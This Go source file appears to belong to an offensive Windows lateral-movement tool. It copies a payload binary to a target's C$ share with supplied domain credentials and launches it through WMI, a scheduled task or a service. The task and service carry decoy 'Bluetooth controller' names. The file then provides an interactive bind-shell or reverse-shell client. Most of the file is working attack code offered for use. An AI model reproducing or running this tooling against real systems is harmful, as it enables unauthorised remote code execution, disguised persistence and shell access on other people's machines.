package main

import (
	"bytes"
	"fmt"
	"golang.org/x/sys/windows"
	"io"
	"log"
	"net"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"
)

const (
	ENABLE_VIRTUAL_TERMINAL_PROCESSING uint32 = 0x0004
	ENABLE_VIRTUAL_TERMINAL_INPUT      uint32 = 0x0200
	ENABLE_PROCESSED_INPUT             uint32 = 0x0001
	ENABLE_LINE_INPUT                  uint32 = 0x0002
	ENABLE_ECHO_INPUT                  uint32 = 0x0004
	ENABLE_WINDOW_INPUT                uint32 = 0x0008
	ENABLE_MOUSE_INPUT                 uint32 = 0x0010
	ENABLE_INSERT_MODE                 uint32 = 0x0020
	ENABLE_QUICK_EDIT_MODE             uint32 = 0x0040
	ENABLE_EXTENDED_FLAGS              uint32 = 0x0080
	ENABLE_AUTO_POSITION               uint32 = 0x0100
	ENABLE_PROCESSED_OUTPUT            uint32 = 0x0001
)

func handleTCP(target, user, pass, domain, name, dropmethod, ip, shell string, runas, reverse bool, port int, nodelete bool) {
	// TODO - Abstract this to a helper func to reduce code duplication
	// First, no matter what, we must copy gopipe to the target
	fileName := getRandomString(12)
	if name == "" {
		name = fileName
	}

	settings := &Settings{
		UserSpecified: false,
		User:          fmt.Sprintf("%s\\%s", domain, user),
		Password:      pass,
		TargetShare:   "ADMIN$",
		Target:        target,
	}
	if user != "" {
		settings.UserSpecified = true
	}
	if !EstablishConnection(settings, "C$", true) {
		log.Printf("failed to establish connection to C$ share on %s", settings.Target)
		return
	}
	defer EstablishConnection(settings, "C$", false)
	log.Printf("Successfully connected to C$ share on %s\n", target)

	// Copy gopipe to the target
	targetName := fmt.Sprintf(`Windows\Temp\%s.exe`, name)
	targetFile := fmt.Sprintf(`\\%s\C$\%s`, target, targetName)
	log.Printf("Copying gopipe to %s\n", targetFile)
	err := copyFile("", pipebin, targetFile)
	if err != nil {
		log.Printf("Failed to copy file: %v\n", err)
		return
	}

	// Now - if we are doing standard bind - we can start the server and connect to it
	// If we are doing reverse, we need to start client listener and THEN start the server (roughly)
	if dropmethod == "wmi" {
		// Launch the named pipe binary using WMI
		// We will use the same WMI code as before, but we will pass the pipe name as an argument
		// Will always launch in the context of the executing user
		cmd := fmt.Sprintf("cmd.exe /c %s -port %d -shell %s", targetFile, port, shell)
		if reverse {
			cmd = fmt.Sprintf("cmd.exe /c %s -port %d -ip %s -shell %s", targetFile, port, ip, shell)
		}
		err = executeRemoteWMI(target, cmd, "C:\\Windows\\Temp", user, pass, domain)
		if err != nil {
			log.Println(err.Error())
			return
		}
	} else if dropmethod == "task" {
		err = createRemoteScheduledTask(target, name, user, pass, domain, "Bluetooth Controller for Samsung Devices", runas)
		if err != nil {
			log.Printf("Failed to create task: %v\n", err)
			return
		}
		log.Printf("Successfully created task %s at %s \n", name, target)
		cmd := fmt.Sprintf("cmd.exe /k %s -port %d -shell %s", targetFile, port, shell)
		if reverse {
			cmd = fmt.Sprintf("cmd.exe /k %s -port %d -ip %s -shell %s", targetFile, port, ip, shell)
		}
		err = runTask(target, name, user, pass, domain, cmd, runas, true)
		if err != nil {
			if err.Error() != "The service did not respond to the start or control request in a timely fashion." {
				// This does not necessarily mean it didn't start
				log.Println(err.Error())
				return
			}
		}
		// TODO - Check actual task status here
	} else if dropmethod == "service" {
		err := CreateRemoteService(target, name, name, "Bluetooth controller for XAIE", "cmd.exe /c cmd.exe", user, pass, domain, runas)
		if err != nil {
			log.Printf("Failed to create service: %v\n", err)
			return
		}
		log.Printf("Successfully created service %s at %s \n", name, target)
		cmd := fmt.Sprintf("%%COMSPEC%% /c %s -port %d -shell %s", targetFile, port, shell)
		if reverse {
			cmd = fmt.Sprintf("%%COMSPEC%% /c %s -port %d -ip %s -shell %s", targetFile, port, shell)
		}
		log.Printf("Starting service %s at %s \n", name, target)
		err = executeRemoteService(target, cmd, user, pass, domain, name)
		if err != nil {
			if err.Error() != "The service did not respond to the start or control request in a timely fashion." {
				// This does not necessarily mean it didn't start
				log.Println(err.Error())
			}
		}
	}

	if !reverse {
		handleConnect(&target, &port)
	} else if reverse {
		handleReverseConnect(&port)
	}

	err = os.Remove(targetFile)
	if err != nil {
		log.Println(err.Error())
	}

}

func handleReverseConnect(port *int) {
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", *port))
	if err != nil {
		log.Fatalf("Failed to listen on port %d: %v", *port, err)
	}
	defer listener.Close()

	log.Printf("Reverse Shell Client listening on port %d...\n", *port)
	conn, err := listener.Accept()
	if err != nil {
		log.Fatalf("Error accepting connection: %v", err)
	}
	defer conn.Close()

	// Console Stuff
	inHandle, outHandle, origInMode, origOutMode := saveConsoleSettings()
	configureConsole(inHandle, outHandle)
	defer restoreConsole(inHandle, outHandle, origInMode, origOutMode)
	setupSignalHandler(inHandle, outHandle, origInMode, origOutMode)
	w, h, err := getConsoleSize(outHandle)
	if err == nil {
		log.Printf("Initial terminal size: %dx%d", w, h)
		sendTerminalSizeTCP(conn, w, h)
	}
	done := make(chan struct{})
	var wg sync.WaitGroup
	wg.Add(2)

	// Server -> STDOUT
	doneReceiving := make(chan struct{})
	go func() {
		defer wg.Done()
		defer close(doneReceiving)
		buffer := make([]byte, 4096)

		for {
			select {
			case <-done:
				return
			case <-doneReceiving:
				return
			default:
				n, err := conn.Read(buffer)
				if err != nil {
					if err != io.EOF {
						log.Printf("Error reading from server: %v", err)
					} else {
						log.Printf("Server closed connection")
					}
					return
				}
				_, err = os.Stdout.Write(buffer[:n])
				if err != nil {
					log.Printf("Error writing to stdout: %v", err)
					return
				}
			}
		}
	}()

	// STDIN -> Server
	go func() {
		defer wg.Done()
		defer close(done)
		buffer := make([]byte, 4096)
		commandBuffer := bytes.NewBuffer(nil)
		for {
			select {
			case <-doneReceiving:
				return
			case <-done:
				return
			default:
				n, err := os.Stdin.Read(buffer)
				if err != nil {
					if err != io.EOF {
						log.Printf("Error reading from stdin: %v", err)
					}
					return
				}

				// TODO - Probably more efficient way to do this
				// Basically we are checking if exit+ENTER is the last 5 bytes in stdin
				commandBuffer.Write(buffer[:n])
				c := commandBuffer
				reverseCommand := reverseByteSliceCopy(c.Bytes())
				if len(reverseCommand) > 4 {
					if reverseCommand[0] == 13 && reverseCommand[1] == 116 && reverseCommand[2] == 105 && reverseCommand[3] == 120 && reverseCommand[4] == 101 {
						// Represents exit+ENTER in reverse
						exitSequence := "EXIT_SHELL"
						_, err = conn.Write([]byte(exitSequence))
						if err != nil {
							log.Printf("Error sending exit sequence: %v", err)
							return
						}
						time.Sleep(1 * time.Second)
						return
					}
				}
				if commandBuffer.Len() > 50 {
					commandBytes := commandBuffer.Bytes()
					commandBuffer.Write(commandBytes[len(commandBytes)-1:])
				}

				_, err = conn.Write(buffer[:n])
				if err != nil {
					log.Printf("Error writing to server: %v", err)
					return
				}
			}
		}
	}()
	go monitorTerminalSizeTCP(conn, outHandle, done)
	wg.Wait()
	restoreConsole(inHandle, outHandle, origInMode, origOutMode)
}

func handleConnect(host *string, port *int) {
	// Only print connection message to stdout
	fmt.Printf("Connecting to %s:%d...", *host, *port)

	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", *host, *port))
	if err != nil {
		// For critical errors, we still write to stdout
		fmt.Printf("\nFailed to connect: %v\n", err)
		log.Fatalf("Failed to connect: %v", err)
		os.Exit(1)
	}
	defer conn.Close()

	// Console Stuff
	inHandle, outHandle, origInMode, origOutMode := saveConsoleSettings()
	configureConsole(inHandle, outHandle)
	defer restoreConsole(inHandle, outHandle, origInMode, origOutMode)
	setupSignalHandler(inHandle, outHandle, origInMode, origOutMode)
	w, h, err := getConsoleSize(outHandle)
	if err == nil {
		log.Printf("Initial terminal size: %dx%d", w, h)
		sendTerminalSizeTCP(conn, w, h)
	}
	done := make(chan struct{})
	var wg sync.WaitGroup
	wg.Add(2)

	// Server -> STDOUT
	doneReceiving := make(chan struct{})
	go func() {
		defer wg.Done()
		defer close(doneReceiving)
		buffer := make([]byte, 4096)

		for {
			select {
			case <-done:
				return
			case <-doneReceiving:
				return
			default:
				n, err := conn.Read(buffer)
				if err != nil {
					if err != io.EOF {
						log.Printf("Error reading from server: %v", err)
					} else {
						log.Printf("Server closed connection")
					}
					return
				}
				_, err = os.Stdout.Write(buffer[:n])
				if err != nil {
					log.Printf("Error writing to stdout: %v", err)
					return
				}
			}
		}
	}()

	// STDIN -> Server
	go func() {
		defer wg.Done()
		defer close(done)
		buffer := make([]byte, 4096)
		commandBuffer := bytes.NewBuffer(nil)
		for {
			select {
			case <-doneReceiving:
				return
			case <-done:
				return
			default:
				n, err := os.Stdin.Read(buffer)
				if err != nil {
					if err != io.EOF {
						log.Printf("Error reading from stdin: %v", err)
					}
					return
				}

				// TODO - Probably more efficient way to do this
				commandBuffer.Write(buffer[:n])
				c := commandBuffer
				reverseCommand := reverseByteSliceCopy(c.Bytes())
				if len(reverseCommand) > 4 {
					if reverseCommand[0] == 13 && reverseCommand[1] == 116 && reverseCommand[2] == 105 && reverseCommand[3] == 120 && reverseCommand[4] == 101 {
						// Represents exit+ENTER in reverse
						exitSequence := "EXIT_SHELL"
						_, err = conn.Write([]byte(exitSequence))
						if err != nil {
							log.Printf("Error sending exit sequence: %v", err)
							return
						}
						time.Sleep(1 * time.Second)
						return
					}
				}
				if commandBuffer.Len() > 50 {
					commandBytes := commandBuffer.Bytes()
					commandBuffer.Write(commandBytes[len(commandBytes)-1:])
				}

				_, err = conn.Write(buffer[:n])
				if err != nil {
					log.Printf("Error writing to server: %v", err)
					return
				}
			}
		}
	}()
	go monitorTerminalSizeTCP(conn, outHandle, done)
	wg.Wait()
	restoreConsole(inHandle, outHandle, origInMode, origOutMode)
}

// Save original console settings
func saveConsoleSettings() (windows.Handle, windows.Handle, uint32, uint32) {
	inHandle, err := windows.GetStdHandle(windows.STD_INPUT_HANDLE)
	if err != nil {
		log.Fatalf("Failed to get stdin handle: %v", err)
	}

	outHandle, err := windows.GetStdHandle(windows.STD_OUTPUT_HANDLE)
	if err != nil {
		log.Fatalf("Failed to get stdout handle: %v", err)
	}

	var inMode, outMode uint32
	if err := windows.GetConsoleMode(inHandle, &inMode); err != nil {
		log.Fatalf("Failed to get console input mode: %v", err)
	}

	if err := windows.GetConsoleMode(outHandle, &outMode); err != nil {
		log.Fatalf("Failed to get console output mode: %v", err)
	}

	log.Printf("Saved original console modes: in=0x%x, out=0x%x", inMode, outMode)
	return inHandle, outHandle, inMode, outMode
}

// Configure console for better terminal support
func configureConsole(inHandle, outHandle windows.Handle) {
	// Set input mode for better interactive experience
	// We want raw input, but also window input for resizing
	rawInMode := ENABLE_VIRTUAL_TERMINAL_INPUT | ENABLE_WINDOW_INPUT
	if err := windows.SetConsoleMode(inHandle, rawInMode); err != nil {
		log.Printf("Warning: Failed to set console input mode: %v", err)
	}

	// Get current output mode
	var outMode uint32
	if err := windows.GetConsoleMode(outHandle, &outMode); err != nil {
		log.Printf("Warning: Failed to get console output mode: %v", err)
	}

	// Set output mode to enable ANSI escape sequences
	newOutMode := outMode | ENABLE_VIRTUAL_TERMINAL_PROCESSING | ENABLE_PROCESSED_OUTPUT
	if err := windows.SetConsoleMode(outHandle, newOutMode); err != nil {
		log.Printf("Warning: Failed to set console output mode: %v", err)
	}

	log.Printf("Console configured for terminal emulation")
}

// Restore original console settings
func restoreConsole(inHandle, outHandle windows.Handle, inMode, outMode uint32) {
	// Clear the screen before restoring (using ANSI escape sequence)
	fmt.Print("\x1b[2J\x1b[H")

	if err := windows.SetConsoleMode(inHandle, inMode); err != nil {
		log.Printf("Warning: Failed to restore console input mode: %v", err)
	}

	if err := windows.SetConsoleMode(outHandle, outMode); err != nil {
		log.Printf("Warning: Failed to restore console output mode: %v", err)
	}

	log.Printf("Console restored to original settings")
}

// Set up handler for Ctrl+C and other signals
func setupSignalHandler(inHandle, outHandle windows.Handle, inMode, outMode uint32) {
	c := make(chan os.Signal, 1)
	signal.Notify(c, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-c
		restoreConsole(inHandle, outHandle, inMode, outMode)
		fmt.Println("\nDisconnected from server")
		os.Exit(0)
	}()
}

// Get console window size
func getConsoleSize(handle windows.Handle) (width, height uint16, err error) {
	var info windows.ConsoleScreenBufferInfo
	err = windows.GetConsoleScreenBufferInfo(handle, &info)
	if err != nil {
		return 0, 0, err
	}

	width = uint16(info.Window.Right - info.Window.Left + 1)
	height = uint16(info.Window.Bottom - info.Window.Top + 1)
	return width, height, nil
}

// Send terminal size to the server
// Uses a simple protocol: ESC_RESIZE=WIDTHxHEIGHTESC\
func sendTerminalSizeTCP(conn net.Conn, width, height uint16) {
	resizeMsg := fmt.Sprintf("\x1B_RESIZE=%dx%d\x1B\\", width, height)
	_, err := conn.Write([]byte(resizeMsg))
	if err != nil {
		log.Printf("Failed to send terminal size: %v", err)
	} else {
		log.Printf("Sent terminal size: %dx%d", width, height)
	}
}

// Monitor terminal size changes and send updates to the server
func monitorTerminalSizeTCP(conn net.Conn, handle windows.Handle, done <-chan struct{}) {
	var lastWidth, lastHeight uint16

	// Get initial size
	width, height, err := getConsoleSize(handle)
	if err == nil {
		lastWidth, lastHeight = width, height
	}

	// Check for size changes every 250ms
	ticker := time.NewTicker(250 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			width, height, err := getConsoleSize(handle)
			if err != nil {
				continue
			}

			// Only send if size has changed
			if width != lastWidth || height != lastHeight {
				sendTerminalSizeTCP(conn, width, height)
				lastWidth, lastHeight = width, height
			}
		case <-done:
			return
		}
	}
}
